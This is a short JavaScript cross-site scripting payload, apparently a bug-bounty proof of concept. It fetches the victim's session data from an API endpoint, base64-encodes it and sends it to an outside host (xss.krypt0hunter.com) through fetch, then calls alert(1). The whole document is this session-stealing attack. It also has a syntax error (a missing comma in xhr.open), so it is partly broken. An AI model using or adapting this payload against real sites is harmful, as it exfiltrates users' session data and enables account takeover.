var xhr = new XMLHttpRequest();
xhr.open('GET', 'api/v1/me/session' true);
xhr.onload = function() {
  if (xhr.status === 200) {
    fetch('https://xss.krypt0hunter.com/POC?x=' + btoa(xhr.responseText) );
  }
};
xhr.send();
alert(1);//
